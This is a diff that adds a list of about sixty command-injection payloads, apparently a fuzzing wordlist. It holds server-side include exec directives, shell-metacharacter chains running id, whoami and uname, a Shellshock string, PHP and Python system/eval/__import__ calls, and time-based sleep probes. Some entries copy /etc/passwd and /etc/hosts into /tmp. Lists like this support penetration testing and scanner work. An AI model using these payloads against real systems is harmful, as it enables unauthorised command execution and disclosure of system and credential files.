@@ -1,0 +1,65 @@
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd>/tmp/passwd1
+&lt;!--#exec%20cmd=&quot;/usr/bin/id>/tmp/id1;--&gt;
+/index.html|id>/tmp/id2|
+;id>/tmp/id3;
+;id>/tmp/id4
+|id>/tmp/id5
+|/usr/bin/id>/tmp/id6
+|/usr/bin/id|>/tmp/id7
+|id>/tmp/id8;
+\n/usr/bin/id>/tmp/id9\n
+a;id>/tmp/id12;
+%0Aid>/tmp/id10
+%0Aid>/tmp/id11%0A
+%20{${sleep(11)}}
+() { :;}; /bin/bash -c "sleep 12"
+cat /etc/hosts>/tmp/hosts
+$(`cat /etc/passwd>/tmp/passwd`)
+cat /etc/passwd>/tmp/passwd2
+eval('ls >/tmp/ls2')
+eval('sleep 13')
+eval('sleep 14');
+eval('whoami >/tmp/whoami1')
+eval('whoami >/tmp/whoami2');
+<!--#exec cmd="/bin/cat /etc/passwd>/tmp/passwd3"-->
+<!--#exec cmd="/usr/bin/id>/tmp/id14;-->
+\necho INJECTX\nexit\n\033[2Asleep 16\n
+|| perl -e 'print "X"x16096'>/tmp/perl
+& perl -e 'print "X"x16096'>/tmp/perl2
+<?php system("sleep 17");?>
+| sleep 18
+; sleep 19
+& sleep 21
+&& sleep 12
+sleep 23
+|| sleep 24
+{${sleep(26)}}
+& sleep 27 
+{${sleep(hexdec(dechex(28)))}} 
+|| system('sleep 29');
+| system('sleep 31');
+; system('sleep 32');
+& system('sleep 33');
+&& system('sleep 34');
+system('sleep 36')
+system('sleep 37');
+;uname>/tmp/uname1;
+| uname>/tmp/uname2
+' || whoami>/tmp/whoami3
+" && whoami>/tmp/whoami4
+%0Aid>/tmp/id13
+exec('sleep 38')
+exec('sleep 39');
+system('cat /etc/passwd>/tmp/passwd4');
+'id>/tmp/id111
+'id>/tmp/id222'
+'id>/tmp/id666;'
+';id>/tmp/id888
+';id>/tmp/id123;
+';id>/tmp/id999;'
+'`id>/tmp/id2023`'
+';`id>/tmp/id2022;`'
+__import__('os').system('sleep 41')
+__import__("os").system("sleep 42")
+';__import__('os').system('sleep 43');'
+";__import__('os').system('sleep 44');"
